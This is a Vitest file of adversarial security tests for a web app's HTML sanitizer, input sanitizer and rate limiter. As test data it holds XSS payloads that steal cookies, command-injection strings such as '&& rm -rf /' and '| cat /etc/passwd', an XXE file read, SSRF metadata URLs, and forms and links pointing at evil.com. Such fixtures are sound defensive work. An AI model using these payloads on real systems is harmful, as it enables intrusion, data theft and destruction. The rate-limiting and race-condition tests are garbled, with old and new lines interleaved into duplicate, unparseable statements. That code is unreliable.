import { describe, it, expect } from 'vitest';
import { sanitizeHtml, sanitizeInput } from '../../src/lib/sanitize';
import { limiter } from '../../src/lib/rate-limit';

describe('Adversarial Security Tests', () => {
  describe('XSS Attack Vectors', () => {
    it('should block common XSS payloads from OWASP list', () => {
      const xssPayloads = [
        '<script>alert(document.cookie)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror="alert(1)">',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
      ];

      xssPayloads.forEach(payload => {
        const sanitized = sanitizeHtml(payload);
        expect(sanitized).not.toContain('alert');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('javascript:');
      });
    });

    it('should block polyglot XSS payloads', () => {
      const polyglots = [
        'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>',
        '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>">',
      ];

      polyglots.forEach(payload => {
        const sanitized = sanitizeHtml(payload);
        expect(sanitized).not.toContain('alert');
        expect(sanitized).not.toContain('confirm');
        expect(sanitized).not.toContain('prompt');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
      });
    });

    it('should block encoded XSS attempts', () => {
      const encoded = [
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '\u003cscript\u003ealert(1)\u003c/script\u003e',
      ];

      encoded.forEach(payload => {
        const sanitized = sanitizeHtml(payload);
        // After DOMPurify processes these, they shouldn't execute
        expect(sanitized).not.toContain('script>alert');
      });
    });
  });

  describe('SQL Injection Patterns (Input Validation)', () => {
    it('should preserve SQL injection strings for later validation', () => {
      const sqlInjections = [
        "' OR '1'='1",
        "1' OR 1=1--",
        "' UNION SELECT NULL--",
        "admin'--",
        "' OR '1'='1' /*",
      ];

      sqlInjections.forEach(payload => {
        const sanitized = sanitizeInput(payload);
        // sanitizeInput only trims and removes null bytes
        // Actual SQL injection prevention happens at query level
        expect(sanitized).toBeDefined();
        expect(sanitized).not.toContain('\0');
      });
    });
  });

  describe('Command Injection Patterns', () => {
    it('should preserve command injection attempts for validation', () => {
      const commandInjections = [
        '; ls -la',
        '| cat /etc/passwd',
        '`whoami`',
        '$(whoami)',
        '&& rm -rf /',
      ];

      commandInjections.forEach(payload => {
        const sanitized = sanitizeInput(payload);
        // Input sanitization doesn't prevent command injection
        // Command execution should be avoided or properly escaped
        expect(sanitized).toBeDefined();
      });
    });
  });

  describe('Path Traversal Attacks', () => {
    it('should handle path traversal patterns', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
      ];

      pathTraversals.forEach(payload => {
        const sanitized = sanitizeInput(payload);
        // sanitizeInput doesn't prevent path traversal
        // Path validation should be done separately
        expect(sanitized).toBeDefined();
      });
    });
  });

  describe('Rate Limiting Against Attacks', () => {
    beforeEach(() => {
      // Clear rate limiter state
      (limiter as any).tokens.clear();
    });

    it('should block brute force password attacks', () => {
    it('should block brute force password attacks', async () => {
      const attackerIp = '192.168.1.100';
      const limit = 5;
      let blockedCount = 0;

      // Simulate 100 rapid login attempts
      for (let i = 0; i < 100; i++) {
        if (!limiter.check(limit, attackerIp)) {
        if (!(await limiter.check(limit, attackerIp))) {
          blockedCount++;
        }
      }

      // Should block 95 of 100 attempts
      expect(blockedCount).toBe(95);
    });

    it('should protect against distributed brute force', () => {
    it('should protect against distributed brute force', async () => {
      const limit = 5;
      const attackersBlocked = [];

      // Simulate 50 attackers
      for (let attacker = 0; attacker < 50; attacker++) {
        const ip = `192.168.1.${attacker}`;
        let blocked = false;

        for (let attempt = 0; attempt < 10; attempt++) {
          if (!limiter.check(limit, ip)) {
          if (!(await limiter.check(limit, ip))) {
            blocked = true;
            break;
          }
        }

        if (blocked) {
          attackersBlocked.push(ip);
        }
      }

      // All 50 attackers should be blocked after limit
      expect(attackersBlocked.length).toBe(50);
    });

    it('should prevent credential stuffing attacks', () => {
    it('should prevent credential stuffing attacks', async () => {
      const limit = 3;
      const credentials = [
        'user1:password1',
        'user1:password2',
        'user1:password3',
        'user1:password4',
        'user1:password5',
      ];

      let successfulAttempts = 0;
      let blockedAttempts = 0;

      credentials.forEach(cred => {
        if (limiter.check(limit, 'attacker_ip')) {
      for (const cred of credentials) {
        if (await limiter.check(limit, 'attacker_ip')) {
          successfulAttempts++;
        } else {
          blockedAttempts++;
        }
      });
      }

      expect(successfulAttempts).toBe(3);
      expect(blockedAttempts).toBe(2);
    });
  });

  describe('CSRF Token Bypass Attempts', () => {
    it('should handle empty tokens', () => {
      const emptyToken = '';
      const sanitized = sanitizeInput(emptyToken);
      expect(sanitized).toBe('');
    });

    it('should handle extremely long tokens', () => {
      const longToken = 'a'.repeat(100000);
      const sanitized = sanitizeInput(longToken);
      expect(sanitized.length).toBe(100000);
    });

    it('should handle tokens with null bytes', () => {
      const maliciousToken = 'token\0extra';
      const sanitized = sanitizeInput(maliciousToken);
      expect(sanitized).not.toContain('\0');
      expect(sanitized).toBe('tokenextra');
    });
  });

  describe('HTML Injection Attacks', () => {
    it('should block malicious HTML structures', () => {
      const attacks = [
        '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;">',
        '<form action="https://evil.com" method="post"><input name="data"></form>',
        '<link rel="stylesheet" href="https://evil.com/steal.css">',
        '<meta http-equiv="refresh" content="0;url=https://evil.com">',
        '<base href="https://evil.com/">',
      ];

      attacks.forEach(attack => {
        const sanitized = sanitizeHtml(attack);
        expect(sanitized).not.toContain('evil.com');
        expect(sanitized).not.toContain('position:fixed');
        expect(sanitized).not.toContain('<form');
        expect(sanitized).not.toContain('<link');
        expect(sanitized).not.toContain('<meta');
        expect(sanitized).not.toContain('<base');
      });
    });
  });

  describe('Prototype Pollution Attempts', () => {
    it('should not allow __proto__ in object keys', () => {
      const maliciousInput = '__proto__';
      const sanitized = sanitizeInput(maliciousInput);
      // sanitizeInput doesn't specifically prevent this
      // Object merging and property access should be validated
      expect(sanitized).toBeDefined();
    });

    it('should handle constructor pollution attempts', () => {
      const attacks = [
        'constructor',
        'constructor.prototype',
        '__proto__.toString',
      ];

      attacks.forEach(attack => {
        const sanitized = sanitizeInput(attack);
        expect(sanitized).toBeDefined();
      });
    });
  });

  describe('LDAP Injection Patterns', () => {
    it('should handle LDAP special characters', () => {
      const ldapChars = [
        '*)(uid=*',
        'admin)(&',
        '*(|(uid=*))',
        '*))%00',
      ];

      ldapChars.forEach(payload => {
        const sanitized = sanitizeInput(payload);
        expect(sanitized).toBeDefined();
      });
    });
  });

  describe('XXE (XML External Entity) Patterns', () => {
    it('should block XXE payloads in HTML', () => {
      const xxe = `
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <foo>&xxe;</foo>
      `;

      const sanitized = sanitizeHtml(xxe);
      expect(sanitized).not.toContain('<!ENTITY');
      expect(sanitized).not.toContain('SYSTEM');
      expect(sanitized).not.toContain('file://');
    });
  });

  describe('Server-Side Template Injection', () => {
    it('should handle template syntax in input', () => {
      const templates = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{%raw%}{{7*7}}{%endraw%}',
      ];

      templates.forEach(template => {
        const sanitized = sanitizeInput(template);
        expect(sanitized).toBeDefined();
        // Template execution should be prevented at render time
      });
    });
  });

  describe('NoSQL Injection Patterns', () => {
    it('should handle NoSQL injection characters', () => {
      const noSqlInjections = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "function() { return true; }"}',
      ];

      noSqlInjections.forEach(payload => {
        const sanitized = sanitizeInput(payload);
        expect(sanitized).toBeDefined();
        // NoSQL injection prevention should happen at query level
      });
    });
  });

  describe('HTTP Header Injection', () => {
    it('should remove newlines that could inject headers', () => {
      const headerInjections = [
        'value\r\nX-Injected: true',
        'value\nSet-Cookie: session=hacked',
        'value\r\n\r\n<script>alert(1)</script>',
      ];

      headerInjections.forEach(payload => {
        const sanitized = sanitizeInput(payload);
        // Newlines in middle of string are preserved by sanitizeInput
        // Header validation should happen at HTTP layer
        expect(sanitized).toBeDefined();
      });
    });
  });

  describe('SSRF (Server-Side Request Forgery) Patterns', () => {
    it('should handle internal IP addresses in input', () => {
      const ssrfTargets = [
        'http://localhost',
        'http://127.0.0.1',
        'http://0.0.0.0',
        'http://[::1]',
        'http://169.254.169.254/latest/meta-data/',
      ];

      ssrfTargets.forEach(url => {
        const sanitized = sanitizeInput(url);
        expect(sanitized).toBeDefined();
        // SSRF prevention should happen at HTTP request level
      });
    });
  });

  describe('Race Condition Exploitation', () => {
    it('should handle concurrent rate limit checks', async () => {
      const token = 'concurrent_user';
      const limit = 5;

      // Simulate concurrent requests
      const promises = Array.from({ length: 20 }, () =>
        Promise.resolve(limiter.check(limit, token))
        limiter.check(limit, token)
      );

      const results = await Promise.all(promises);
      const allowed = results.filter(r => r === true).length;

      // Should only allow up to the limit
      expect(allowed).toBeLessThanOrEqual(limit);
    });
  });

  describe('Memory Exhaustion Attacks', () => {
    it('should handle extremely large inputs', () => {
      const huge = 'x'.repeat(1000000); // 1MB string
      
      expect(() => {
        const sanitized = sanitizeInput(huge);
        expect(sanitized.length).toBe(1000000);
      }).not.toThrow();
    });

    it('should handle deeply nested HTML', () => {
      let nested = 'content';
      for (let i = 0; i < 100; i++) {
        nested = `<p>${nested}</p>`;
      }

      expect(() => {
        const sanitized = sanitizeHtml(nested);
        expect(sanitized).toBeDefined();
      }).not.toThrow();
    });
  });

  describe('ReDoS (Regular Expression Denial of Service)', () => {
    it('should handle inputs designed to cause ReDoS', () => {
      const redosPatterns = [
        'a'.repeat(100) + '!',
        '(a+)+$',
        '([a-zA-Z]+)*$',
      ];

      redosPatterns.forEach(pattern => {
        const startTime = Date.now();
        const sanitized = sanitizeInput(pattern);
        const endTime = Date.now();

        expect(sanitized).toBeDefined();
        // Should complete in reasonable time
        expect(endTime - startTime).toBeLessThan(1000);
      });
    });
  });

  describe('Unicode Normalization Attacks', () => {
    it('should handle Unicode normalization exploits', () => {
      const unicodeAttacks = [
        '\u0041\u0301', // Á (decomposed)
        '\u00C1', // Á (precomposed)
        '\uFEFF', // Zero-width no-break space
        '\u200B', // Zero-width space
      ];

      unicodeAttacks.forEach(attack => {
        const sanitized = sanitizeInput(attack);
        expect(sanitized).toBeDefined();
      });
    });
  });

  describe('File Upload Bypass Attempts', () => {
    it('should handle dangerous file extensions in input', () => {
      const dangerousFiles = [
        'malware.exe',
        'script.php',
        'shell.jsp',
        'backdoor.aspx',
        'evil.sh',
      ];

      dangerousFiles.forEach(filename => {
        const sanitized = sanitizeInput(filename);
        expect(sanitized).toBeDefined();
        // File validation should happen at upload handler
      });
    });

    it('should handle double extensions', () => {
      const doubleExtensions = [
        'image.jpg.exe',
        'document.pdf.php',
        'file.png.js',
      ];

      doubleExtensions.forEach(filename => {
        const sanitized = sanitizeInput(filename);
        expect(sanitized).toBeDefined();
      });
    });
  });
});